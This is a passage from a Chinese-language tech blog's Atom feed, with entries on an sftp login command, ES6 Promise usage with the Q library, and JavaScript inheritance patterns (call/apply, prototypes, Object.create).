&lt;h4 id=&quot;登陆&quot;&gt;&lt;a href=&quot;#登陆&quot; class=&quot;headerlink&quot; title=&quot;登陆&quot;&gt;&lt;/a&gt;登陆&lt;/h4&gt;&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;sftp username@remote_hostname_or_IP&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://youngdze.co/categories/Linux/"/>
    
    
      <category term="sftp" scheme="http://youngdze.co/tags/sftp/"/>
    
  </entry>
  
  <entry>
    <title>ECMAScript6 Promise</title>
    <link href="http://youngdze.co/2015/09/08/ecmascript6-promise/"/>
    <id>http://youngdze.co/2015/09/08/ecmascript6-promise/</id>
    <published>2015-09-08T03:07:25.000Z</published>
    <updated>2016-12-05T11:43:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Promise-解释"><a href="#Promise-解释" class="headerlink" title="Promise 解释"></a><em>Promise</em> 解释</h4><blockquote><p>The Promise object is used for deferred and asynchronous computations.</p></blockquote><a id="more"></a><h4 id="Promise-语法"><a href="#Promise-语法" class="headerlink" title="Promise 语法"></a><em>Promise</em> 语法</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(executor);</div><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123; ... &#125;);</div></pre></td></tr></table></figure><h4 id="Promise-结构"><a href="#Promise-结构" class="headerlink" title="Promise 结构"></a><em>Promise</em> 结构</h4><h5 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;&#125;);</div></pre></td></tr></table></figure><p><strong>resolve(thenable)</strong></p><p>Your promise will be fulfilled/rejected with the outcome of thenable</p><p><strong>resolve(obj)</strong></p><p>Your promise is fulfilled with obj</p><p><strong>reject(obj)</strong></p><p>Your promise is rejected with obj. For consistency and debugging (eg stack traces), obj should be an instanceof Error. Any errors thrown in the constructor callback will be implicitly passed to reject(). Instance Methods</p><p><strong>promise.then(onFulfilled, onRejected)</strong></p><p>onFulfilled is called when/if “promise” resolves. onRejected is called when/if “promise” rejects. Both are optional, if either/both are omitted the next onFulfilled/onRejected in the chain is called. Both callbacks have a single parameter, the fulfillment value or rejection reason. “then” returns a new promise equivalent to the value you return from onFulfilled/onRejected after being passed through Promise.resolve. If an error is thrown in the callback, the returned promise rejects with that error.</p><p><strong>promise.catch(onRejected)</strong></p><p>Sugar for promise.then(undefined, onRejected)</p><h5 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (<span class="literal">false</span>) &#123;</div><div class="line">    resolve(<span class="string">'Stuff worked!'</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    reject(<span class="string">'It broke'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line"></div><div class="line">p.then(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(result);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="接受参数的例子"><a href="#接受参数的例子" class="headerlink" title="接受参数的例子"></a>接受参数的例子</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (err) reject(err);</div><div class="line">        resolve(data);</div><div class="line">    &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="还可以用-Promise-catch-捕获错误"><a href="#还可以用-Promise-catch-捕获错误" class="headerlink" title="还可以用 Promise.catch() 捕获错误"></a>还可以用 <code>Promise.catch()</code> 捕获错误</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">        <span class="keyword">if</span> (err) reject(err);</div><div class="line">        resolve(data);</div><div class="line">    &#125;);</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="链式请求"><a href="#链式请求" class="headerlink" title="链式请求"></a>链式请求</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">get(<span class="string">'es.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(response);</div><div class="line">&#125;).then(<span class="literal">undefined</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h5 id="异步请求例子"><a href="#异步请求例子" class="headerlink" title="异步请求例子"></a>异步请求例子</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="comment">// Return a new promise.</span></div><div class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</div><div class="line">    <span class="comment">// Do the usual XHR stuff</span></div><div class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">    req.open(<span class="string">'GET'</span>, url);</div><div class="line"></div><div class="line">    req.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="comment">// This is called even on 404 etc</span></div><div class="line">        <span class="comment">// so check the status</span></div><div class="line">        <span class="keyword">if</span> (req.status == <span class="number">200</span>) &#123;</div><div class="line">        <span class="comment">// Resolve the promise with the response text</span></div><div class="line">        resolve(req.response);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">// Otherwise reject with the status text</span></div><div class="line">        <span class="comment">// which will hopefully be a meaningful error</span></div><div class="line">        reject(<span class="built_in">Error</span>(req.statusText));</div><div class="line">        &#125;</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// Handle network errors</span></div><div class="line">    req.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        reject(<span class="built_in">Error</span>(<span class="string">"Network Error"</span>));</div><div class="line">    &#125;;</div><div class="line"></div><div class="line">    <span class="comment">// Make the request</span></div><div class="line">    req.send();</div><div class="line">    &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'story.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">"Success!"</span>, response);</div><div class="line">&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.error(<span class="string">"Failed!"</span>, error);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><h4 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h4><p><em>Q</em> 指的是 <a href="https://github.com/kriskowal/q" target="_blank" rel="external">kriskowal/q</a>，一个提供 <strong>Promise</strong> 特性的组件。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> Q = <span class="built_in">require</span>(<span class="string">'q'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">url</span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> d = Q.defer();</div><div class="line">    fs.readFile(url, <span class="string">'utf8'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (err) d.reject(err);</div><div class="line">    d.resolve(data);</div><div class="line">    &#125;);</div><div class="line">    <span class="keyword">return</span> d.promise;</div><div class="line">&#125;</div><div class="line"></div><div class="line">get(<span class="string">'es6.js'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> data.length;</div><div class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(data);</div><div class="line">&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(err);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Promise-解释&quot;&gt;&lt;a href=&quot;#Promise-解释&quot; class=&quot;headerlink&quot; title=&quot;Promise 解释&quot;&gt;&lt;/a&gt;&lt;em&gt;Promise&lt;/em&gt; 解释&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;The Promise object is used for deferred and asynchronous computations.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="Promise" scheme="http://youngdze.co/tags/Promise/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 继承</title>
    <link href="http://youngdze.co/2015/09/07/javascript-inheritance/"/>
    <id>http://youngdze.co/2015/09/07/javascript-inheritance/</id>
    <published>2015-09-07T15:53:09.000Z</published>
    <updated>2017-02-06T11:21:46.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="call-amp-apply"><a href="#call-amp-apply" class="headerlink" title="call &amp; apply"></a>call &amp; apply</h3><p><code>call</code> 和 <code>apply</code> 作用基本相同，都可以让一个对象引用另一个对象或它的方法，两者唯一的<a href="http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply" target="_blank" rel="external">不同</a>是 <code>call</code> 接受函数参数的方式是一个个列出来，<code>apply</code> 接受函数参数的方式是一个数组。 <a id="more"></a></p><p><code>call</code> 的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/call" target="_blank" rel="external">定义</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun.call(thisArg[, arg1[, arg2[, ...]]])</div></pre></td></tr></table></figure><p><code>apply</code> 的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" target="_blank" rel="external">定义</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fun.apply(thisArg, [argsArray])</div></pre></td></tr></table></figure><h4 id="call-的继承"><a href="#call-的继承" class="headerlink" title="call 的继承"></a><code>call</code> 的继承</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    Animal.call(<span class="keyword">this</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</div><div class="line">cat.showName();</div></pre></td></tr></table></figure><h4 id="apply-的继承"><a href="#apply-的继承" class="headerlink" title="apply 的继承"></a><code>apply</code> 的继承</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class0</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.showSub = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</div><div class="line">        alert(a-b);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class1</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.showAdd = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>) </span>&#123;</div><div class="line">        alert(a+b);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Class2</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    Class10.apply(<span class="keyword">this</span>);</div><div class="line">    Class11.apply(<span class="keyword">this</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>call</code> 和 <code>apply</code> 的继承方法都不能继承原型链。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animal</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.showName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        alert(<span class="keyword">this</span>.name);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Animal.prototype.say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>)</span>&#123;</div><div class="line">    Animal.call(<span class="keyword">this</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">"Black Cat"</span>);</div><div class="line">cat.say();    <span class="comment">// Uncaught TypeError: cat.say is not a function</span></div></pre></td></tr></table></figure><h3 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Mammal = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Mammal.prototype.greeting = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="string">'Hello '</span> + <span class="keyword">this</span>.name + <span class="string">"!"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> Cat = <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</div><div class="line">Cat.prototype.constructor = Cat;       <span class="comment">// 否则 Cat 的实例的构造函数将会是 Mammal 的构造函数</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> cat = <span class="keyword">new</span> Cat(<span class="string">'Garfield'</span>);</div><div class="line">cat.greeting();</div></pre></td></tr></table></figure><p>复杂点例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Mammal</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">    <span class="keyword">this</span>.offspring = [];</div><div class="line">&#125;</div><div class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> Mammal(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</div><div class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</div><div class="line">    <span class="keyword">return</span> newBaby;</div><div class="line">&#125;</div><div class="line">Mammal.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'[Mammal "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Cat.prototype = <span class="keyword">new</span> Mammal();</div><div class="line">Cat.prototype.constructor = Cat;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.name = name;</div><div class="line">&#125;</div><div class="line">Cat.prototype.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">'[Cat "'</span> + <span class="keyword">this</span>.name + <span class="string">'"]'</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><code>haveABaby</code> 继承还可以这样写：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">Mammal.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> newBaby = <span class="keyword">new</span> <span class="keyword">this</span>.constructor(<span class="string">"Baby "</span> + <span class="keyword">this</span>.name);</div><div class="line">    <span class="keyword">this</span>.offspring.push(newBaby);</div><div class="line">    <span class="keyword">return</span> newBaby;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 这里的 this.parent 类似典型 OO 语言中的 super</span></div><div class="line">Cat.prototype.parent = Mammal.prototype;</div><div class="line">Cat.prototype.haveABaby = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">var</span> theKitten = <span class="keyword">this</span>.parent.haveABaby.call(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">return</span> theKitten;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="Object-create"><a href="#Object-create" class="headerlink" title="Object.create()"></a>Object.create()</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Shape - superclass</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Shape</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.x = <span class="number">0</span>;</div><div class="line">    <span class="keyword">this</span>.y = <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// superclass method</span></div><div class="line">Shape.prototype.move = <span class="function"><span class="keyword">function</span>(<span class="params">x, y</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>.x += x;</div><div class="line">    <span class="keyword">this</span>.y += y;</div><div class="line">    <span class="built_in">console</span>.info(<span class="string">'Shape moved.'</span>);</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="comment">// Rectangle - subclass</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Rectangle</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    Shape.call(<span class="keyword">this</span>); <span class="comment">// call super constructor.</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// subclass extends superclass</span></div><div class="line">Rectangle.prototype = <span class="built_in">Object</span>.create(Shape.prototype)</div><div class="line">Rectangle.prototype.constructor = Rectangle;</div><div class="line"></div><div class="line"><span class="keyword">var</span> rect = <span class="keyword">new</span> Rectangle();</div><div class="line"></div><div class="line">rect <span class="keyword">instanceof</span> Rectangle;  <span class="comment">// true</span></div><div class="line">rect <span class="keyword">instanceof</span> Shape;  <span class="comment">// true</span></div><div class="line">rect.move(<span class="number">1</span>, <span class="number">1</span>) <span class="comment">// Outputs, 'Shape moved.'</span></div></pre></td></tr></table></figure><h3 id="自制继承方法"><a href="#自制继承方法" class="headerlink" title="自制继承方法"></a>自制继承方法</h3><p>来自 <a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="external">OOP</a>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Function</span>.prototype.inheritsFrom = <span class="function"><span class="keyword">function</span>(<span class="params">parentClassOrObject</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (parentClassOrObject.constructor == <span class="built_in">Function</span>) &#123;</div><div class="line">        <span class="comment">//Normal Inheritance</span></div><div class="line">        <span class="keyword">this</span>.prototype = <span class="keyword">new</span> parentClassOrObject;</div><div class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</div><div class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject.prototype;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="comment">//Pure Virtual Inheritance</span></div><div class="line">        <span class="keyword">this</span>.prototype = parentClassOrObject;</div><div class="line">        <span class="keyword">this</span>.prototype.constructor = <span class="keyword">this</span>;</div><div class="line">        <span class="keyword">this</span>.prototype.parent = parentClassOrObject;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Cat.inheritsFrom(Mammal);</div></pre></td></tr></table></figure><p>参考：</p><ul><li><a href="http://phrogz.net/js/classes/OOPinJS2.html" target="_blank" rel="external">OOP in JS, Part 2 : Inheritance</a></li><li><a href="http://uule.iteye.com/blog/1158829" target="_blank" rel="external">JS中的call()和apply()方法</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;call-amp-apply&quot;&gt;&lt;a href=&quot;#call-amp-apply&quot; class=&quot;headerlink&quot; title=&quot;call &amp;amp; apply&quot;&gt;&lt;/a&gt;call &amp;amp; apply&lt;/h3&gt;&lt;p&gt;&lt;code&gt;call&lt;/code&gt; 和 &lt;code&gt;apply&lt;/code&gt; 作用基本相同，都可以让一个对象引用另一个对象或它的方法，两者唯一的&lt;a href=&quot;http://stackoverflow.com/questions/1986896/what-is-the-difference-between-call-and-apply&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;不同&lt;/a&gt;是 &lt;code&gt;call&lt;/code&gt; 接受函数参数的方式是一个个列出来，&lt;code&gt;apply&lt;/code&gt; 接受函数参数的方式是一个数组。
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
  </entry>
  
  <entry>
    <title>AsyncJS 基础</title>
    <link href="http://youngdze.co/2015/09/06/asyncjs-basis/"/>
    <id>http://youngdze.co/2015/09/06/asyncjs-basis/</id>
    <published>2015-09-06T06:01:30.000Z</published>
    <updated>2016-12-05T05:38:28.000Z</updated>
    
